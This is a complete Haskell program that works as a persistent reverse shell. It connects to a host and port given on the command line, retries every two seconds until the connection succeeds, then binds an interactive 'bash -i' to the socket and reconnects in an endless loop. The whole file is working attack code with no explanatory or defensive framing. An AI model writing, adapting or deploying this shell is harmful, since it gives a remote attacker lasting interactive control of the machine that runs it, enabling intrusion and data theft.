module Main where

import Network.Socket     ( HostName
                          , ServiceName
                          , AddrInfo ( addrFamily
                                     , addrSocketType
                                     , addrProtocol
                                     , addrAddress
                                     )
                          , Socket
                          , connect
                          , socket
                          , socketToHandle
                          , defaultProtocol
                          , defaultHints
                          , getAddrInfo
                          , Family ( AF_INET )
                          , SocketType ( Stream )
                          )

import Control.Monad      ( liftM
                          )

import Control.Exception  ( bracket
                          , catch
                          )

import System.IO          ( Handle
                          , hClose
                          , IOMode ( ReadWriteMode)
                          )

import System.Process     ( CreateProcess ( std_in
                                          , std_out
                                          , std_err
                                          , delegate_ctlc
                                          )
                          , StdStream ( UseHandle )
                          , waitForProcess
                          , shell
                          , createProcess
                          )

import System.Environment ( getArgs )

import System.Exit        ( ExitCode
                          )

import Control.Concurrent ( threadDelay
                          )

main :: IO ()
main = do
  (hn:pn:_) <- getArgs
  sock <- connSocket hn pn
  addrinfos <- resolve hn pn
  bracket
    (tryToConnect sock addrinfos)
    hClose
    runConnection
  main
    where
      resolve :: HostName
              -> ServiceName
              -> IO AddrInfo
      resolve hn pn = head <$> getAddrInfo (Just hints) (Just hn) (Just pn)

      hints :: AddrInfo
      hints = defaultHints
        { addrFamily     = AF_INET
        , addrSocketType = Stream
        , addrProtocol   = defaultProtocol
        }

      connSocket :: HostName -> ServiceName -> IO Socket
      connSocket hn pn = do
        addrinfos <- resolve hn pn
        socket
          (addrFamily addrinfos)
          (addrSocketType addrinfos)
          (addrProtocol addrinfos)

      tryToConnect :: Socket
                   -> AddrInfo
                   -> IO Handle
      tryToConnect sock addrinfos = catch
        (connect sock (addrAddress addrinfos) >> socketToHandle sock ReadWriteMode)
        $ hSocketErr sock addrinfos
          where
            hSocketErr :: Socket
                       -> AddrInfo
                       -> IOError
                       -> IO Handle
            hSocketErr sock addrinfos _ = do
              threadDelay 2000000
              tryToConnect sock addrinfos

      runConnection :: Handle
                    -> IO ExitCode
      runConnection hdl = do
        (_,_,_,ph) <- createProcess $
          (shell "bash -i")
            { std_out       = UseHandle hdl
            , std_in        = UseHandle hdl
            , std_err       = UseHandle hdl
            , delegate_ctlc = True }
        waitForProcess ph
